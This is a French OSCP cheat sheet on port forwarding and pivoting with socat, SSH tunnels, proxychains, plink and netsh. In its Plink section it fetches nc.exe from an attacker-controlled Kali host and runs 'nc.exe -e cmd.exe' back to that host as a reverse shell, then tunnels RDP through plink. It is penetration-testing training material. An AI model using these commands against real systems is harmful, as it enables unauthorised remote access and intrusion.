---
title: "OSCP · Redirection de ports"
description: "Documenter les redirections locales, distantes et dynamiques."
---

# OSCP · Redirection de ports

Documenter les redirections locales, distantes et dynamiques.


## Redirection avec Socat

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Exemple avec l&#x27;outil socat.</p>

```bash
socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
```


## Redirection SSH locale

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Ouvrir une connexion SSH avec les paramètres indiqués.</p>

```bash
ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
```


## Redirection SSH dynamique

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Ouvrir une connexion SSH avec les paramètres indiqués.</p>

```bash
ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Redirection SSH dynamique ».</p>

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [local_socks_proxy_port]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil proxychains.</p>

```bash
# For example
proxychains smbclient -L //internal_ip/ -U username --password=password
```


## Redirection SSH distante

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Ouvrir une connexion SSH avec les paramètres indiqués.</p>

```bash
ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
```


## SSH Remote Dynamic Redirection de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Ouvrir une connexion SSH avec les paramètres indiqués.</p>

```bash
ssh -N -R [proxychains_port] username@remote_host
```


<p class="oscp-command-note">Exemple technique pour la rubrique « SSH Remote Dynamic Redirection de ports ».</p>

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [proxychains_port]
```


## SSH (Windows)

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Exemple avec l&#x27;outil where.</p>

```powershell
where ssh
ssh.exe -V
```


<p class="oscp-command-note">Ouvrir une connexion SSH avec les paramètres indiqués.</p>

```powershell
ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
```


<p class="oscp-command-note">Exemple technique pour la rubrique « SSH (Windows) ».</p>

```bash
# Edit /etc/proxychains4.conf and add
[ProxyList]
socks5 127.0.0.1 [REMOTE_PORT]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil ss.</p>

```bash
ss -ntplu
```


## Plink (Windows)

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Exemple avec l&#x27;outil systemctl.</p>

```bash
sudo systemctl start apache2
```


**Paramètres et repères :**
`nc.exe`  


<p class="oscp-command-note">Rechercher ou filtrer des données.</p>

```bash
find / -name nc.exe 2>/dev/null
sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
```


**Paramètres et repères :**
`nc.exe`  


<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>

```powershell
wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
```


**Paramètres et repères :**
`nc.exe`  


<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>

```powershell
C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]
```


<p class="oscp-command-note">Rechercher ou filtrer des données.</p>

```bash
find / -name plink.exe 2>/dev/null
sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
```


<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>

```powershell
wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe
```


<p class="oscp-command-note">Exemple avec l&#x27;outil cmd.exe.</p>

```powershell
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil xfreerdp.</p>

```bash
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]
```


## Netsh (Windows)

Observer les permissions et la configuration de Windows.


**Paramètres et repères :**
`Netsh`  


<p class="oscp-command-note">Exemple avec l&#x27;outil netsh.</p>

```powershell
netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil netstat.</p>

```powershell
netstat -anp TCP | find "[LISTEN_PORT]"
```


<p class="oscp-command-note">Exemple avec l&#x27;outil netsh.</p>

```powershell
netsh interface portproxy show all
```


```powershell
netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow
```


<p class="oscp-command-note">Ouvrir une connexion SSH avec les paramètres indiqués.</p>

```bash
ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil netsh.</p>

```powershell
netsh advfirewall firewall delete rule name="[RULE_NAME]"
```


```powershell
netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
